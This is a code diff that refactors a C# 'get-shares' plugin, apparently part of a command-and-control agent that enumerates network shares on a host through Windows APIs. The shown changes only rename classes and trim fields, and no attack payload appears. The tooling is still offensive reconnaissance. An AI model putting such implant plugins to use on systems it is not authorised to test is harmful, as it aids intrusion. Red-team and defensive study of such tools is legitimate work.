@@ -3,9 +3,9 @@ using Agent.Models;
 using Agent.Utilities;
 using System.Runtime.InteropServices;
 using System.Text;
-namespace Plugins
+namespace Agent
 {
-    public class GetShares : IPlugin
+    public class Plugin : IPlugin
     {
         public string Name => "get-shares";
         #region External Calls
@@ -43,16 +43,12 @@ namespace Plugins
         #endregion
         const uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;
         const int NERR_Success = 0;
-        public IAgentConfig config { get; set; }
-        public IMessageManager messageManager { get; set; }
-        public ILogger logger { get; set; }
-        public ITokenManager tokenManager { get; set; }
+        private IMessageManager messageManager { get; set; }
+        private ITokenManager tokenManager { get; set; }
 
-        public GetShares(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
         {
             this.messageManager = messageManager;
-            this.config = config;
-            this.logger = logger;
             this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
